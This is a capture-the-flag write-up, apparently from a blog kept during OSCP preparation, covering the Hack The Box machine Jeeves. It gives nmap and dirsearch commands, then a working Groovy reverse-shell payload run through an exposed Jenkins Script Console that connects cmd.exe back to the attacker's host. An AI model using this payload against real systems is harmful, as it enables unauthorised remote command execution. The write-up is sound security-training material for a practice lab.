---
title:  "Hack The Box / Jeeves"
date: 2020-01-18
tags: [Penetration Testing, Hacking, Hack The Box, Jeeves, OSCP, Offensive Security]
header: 
  image: "assets/images/jeeves/jeeves-rooted.jpg"
---

Welcome! So, before starting with couple ways of getting this box, I want to explain the goal of this and the following posts. After two attempts to pass my OSCP exam (which both attemps failed) I looked the need to practice and explain some of the learning obtained with different machines in Hack The Box, so I decided to make some challenging boxes before my third attempt to the OSCP exam. I chose this list from [NetSec Focus](https://www.netsecfocus.com/) in order to improve my penetration testing skills. From this list Jeeves is the first box, so let's get to it. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/list.jpg" alt="oscp list">

## Information Gathering

### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine. 

```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.63
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nmap-scan.png" alt="nmap scan">

Looks like we have some HTTP services running in port 80 and 50000. Also we can deduce that the machine is running Windows due to the IIS server. There is a good chance to scan the port 445 which is running a SMB service, but unfortunately the results are not helpful. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nmap-scripts.png" alt="smb scan">

### Directory Brute Force
Then, having HTTP service running in port 80 and 50000 and running [dirsearch](https://github.com/maurosoria/dirsearch) in both ports, we get some good results in port 50000.

Results from browser and dirsearch running in port 80. 
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/browser-80.png" alt="browser">

```
python3 dirsearch.py -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 50
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/dir-80.png" alt="dirsearch">

Results rom browser and dirsearch running in port 50000.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/not-found.png" alt="browser">

```
python3 dirsearch.py -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 50
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/dir-50000.png" alt="dirsearch">

Bingo! We have something to look at __http://10.10.10.63/askjeeves/__

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/jenkins.png" alt="browser">

So, after visitin this page and looking around things, in __"Manage Jenkins"__ there is something interesting called __"Script Console"__, and after googling around its exploitation we found something useful from [Hacking Articles](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/).

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/jenkins-manage.png" alt="Manage Jenkins">

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/script-console.png" alt="Script Console">

## Reverse Shell
Knowing that we can do some exploitation with the script console in Jenkins. There are couple methods to get a reverse shell where I'll share two. 

### Reverse Shell - Method #1
After googling around things such as "jenkins language scripting" or "jenkins reverse shell" there is information that says that the langauage used to execute scripts in the console is called "Groovy". So, from this language the reverse shell obtained came from ["frohoff"](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on github. 

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Then, adding this code and replace "localhost" for our IP and cliking "Run" I got a reverse shell!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/reverse-shell1.png" alt="Reverse Shell #1">

and wollah!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/netcat-shell.png" alt="NetCat Shell #1">



